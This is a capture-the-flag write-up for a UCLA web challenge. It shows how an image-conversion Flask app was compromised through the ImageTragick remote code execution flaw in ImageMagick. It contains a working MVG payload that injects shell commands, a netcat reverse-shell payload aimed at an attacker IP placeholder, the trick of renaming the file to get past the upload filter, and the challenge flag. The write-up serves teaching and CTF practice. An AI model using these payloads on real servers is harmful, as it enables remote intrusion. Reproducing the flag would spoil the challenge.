## HerpDerp converter

__Description__

```
HerpDerp Co. has come out with a shiny new webapp. Considering their lack of
awareness of security updates, maybe their app is vulnerable in some way?

http://ctf2.linux.ucla.edu:8090/convert
```

__Hint__

```
A vulnerability in ImageMagick has been making the rounds recently...
```

__Flag__

```
frhniopjixvdranv
```

__Points__

```
80
```

## Solution

The source code for the Flask webapp is in the `converter` directory.

Upon visiting the website, it looks extremely spartan, and the only way to
interact with it is to upload something. It's clear that, if the website can be
exploited at all, it must be by uploading a specially crafted file (OWASP calls
this an [Unrestricted File
Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
vulnerability).

There are many directions one can go with this. Perhaps it's a PHP app that
accidentally executes PHP code within the file. Perhaps it's vulnerable to
weird filenames. Perhaps it's a way of uploading code to the server, with a
separate vuln to execute it.

Admittedly, unless you've been following the news recently or you utilize the
hint, you may not suspect the vulnerability to be in the image processing
library itself, in this case __ImageMagick__. The so-called
[ImageTragick](https://imagetragick.com/) vulnerability allows remote code
execution by giving the ImageMagick engine certain types of files.

It's easier to test the vulnerability locally by installing ImageMagick.
Adapted from the CVE POC, if we have an `exploit.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"; whoami; # ")'
pop graphic-context
```

It will successfully trigger the vuln:

```
$ identify wat.jpg 
vincent
```

Once you can reproduce an RCE, then you can easily open a reverse shell. First,
from a machine with a publicly accessible IP, run this to listen on a port:

```
nc -l -p 10000
```

You can then craft an image like this:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 10000 > /tmp/f; echo ")'
pop graphic-context
```

Where `<IP>` is the publicly accessible IP. This will make a bidirectional pipe
between a shell on the server and your machine.

One slight problem is that, when you try to upload exploit.mvg to the website,
it will reject it by saying `Sorry, we only deal with jpg, png, and gifs!`.
This turns out to be trivial to deal with: simply change the filename to
"exploit.jpg".

The exploit will work flawlessly, and the flag will be sitting there waiting
for you to pluck it.

```
$ nc -l -p 10000
(env)\u@\h:\w$ id
uid=1000(magick) gid=1000(magick) groups=1000(magick)
(env)\u@\h:\w$ ls flag*
flag_hdconverter
(env)\u@\h:\w$ cat flag_hdconverter
frhniopjixvdranv
```

(As of 05/26/16, this vuln was still present in a fully updated Ubuntu 14.04,
which I found amusing enough to make a flag out of).
